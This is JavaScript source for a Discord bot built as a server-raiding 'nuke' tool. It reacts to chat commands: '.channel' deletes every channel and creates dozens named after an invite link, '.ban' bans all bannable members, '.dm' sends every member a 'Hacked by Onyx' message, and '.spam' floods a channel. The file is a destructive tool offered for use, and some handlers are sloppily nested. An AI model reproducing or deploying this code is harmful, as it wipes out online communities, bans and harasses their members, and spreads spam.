const Discord = require("discord.js");
const bot = new Discord.Client();

bot.on("ready", () => {
    console.log("Ready");
    bot.user.setGame("Enigma v5.1");
  })

bot.on("message", function(message){
    if(message.content == ".channel"){
        message.guild.channels.forEach(channel => channel.delete())
        message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
    }

    bot.on("message", function(message){
        if(message.content == ".ban"){
            message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
			message.delete(1000);
        }
    })

    bot.on("message", function(message){
        if(message.content == ".dm"){
            bot.guilds.get(message.guild.id).members.forEach(members1 => {
                members1.send("**" + message.guild.name + " 's server has been Hacked by Onyx**")
            })
        }
    })

    bot.on("message", function(mesasge){
        if(message.content == ".spam"){
            message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		message.channel.send("**Hacked by Onyx**")
		
        }
    })
})

bot.login(process.env.TOKEN_BOT)
